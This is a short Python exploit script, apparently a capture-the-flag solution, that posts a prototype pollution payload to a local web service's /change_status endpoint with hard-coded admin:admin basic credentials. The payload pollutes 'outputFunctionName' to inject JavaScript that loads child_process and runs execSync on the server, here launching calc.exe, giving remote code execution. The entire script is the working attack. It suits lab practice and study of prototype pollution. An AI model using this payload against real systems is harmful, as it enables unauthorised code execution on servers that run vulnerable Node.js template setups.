from requests import *

url = "http://127.0.0.1:1337/change_status"

header={"Authorization":"Basic YWRtaW46YWRtaW4="}
#data = {"doors":"123","status":"offline"}
#data = {"constructor/prototype/ahihi":"ccc"}
#solution
data = {"constructor/prototype/outputFunctionName": "a; return global.process.mainModule.constructor._load(\"child_process\").execSync(\"calc.exe\");//"}
send = post(url,json=data,headers=header)



